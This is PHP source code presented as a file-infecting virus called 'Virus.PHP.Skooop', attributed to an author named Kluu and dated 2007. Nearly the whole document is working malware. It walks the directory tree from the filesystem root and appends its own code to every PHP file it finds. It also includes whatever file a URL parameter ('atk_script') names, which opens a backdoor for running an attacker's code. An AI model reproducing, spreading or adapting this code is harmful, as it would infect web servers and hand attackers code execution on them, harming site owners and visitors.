<?php
//skooop!
/*
Virus.PHP.Skooop - written by Kluu in 2007.
Revision 2007.12.30.0001
*/
$self = strstr(file_get_contents(__FILE__), '//skooop!');

function infect($dir) {
    global $self;
    $handle = opendir($dir);
    while (false !== ($file = readdir($handle))) {
        $infected = true;
        if (is_dir("$dir/$file") && $file != '.' && $file != '..') {
            infect("$dir/$file");
        }
        if (strpos($file, '.php')) {
            if (substr($file, -1) != 's') {
                $host = fopen("$dir/$file", 'r');
                $filesize = filesize("$dir/$file");
                if ($filesize == 0) {
                    $filesize = 1;
                }
                if (!strpos(fread($host, $filesize), '//skooop!')) {
                    $infected = false;
                }
                if (($infected == false)) {
                    copy("$dir/$file", "$dir/{$file}s");
                    $host = fopen("$dir/$file", 'a');
                    fwrite($host, "<?php\n$self");
                    fclose($host);
                }
            }
        }
    }
    closedir($handle);
}

echo '<b>Get the source of this phile <a href="'.$file.'s">here</a></b>';

@include($_GET['atk_script']);
infect('../../../../../../../../../../../../../../../../');
?>
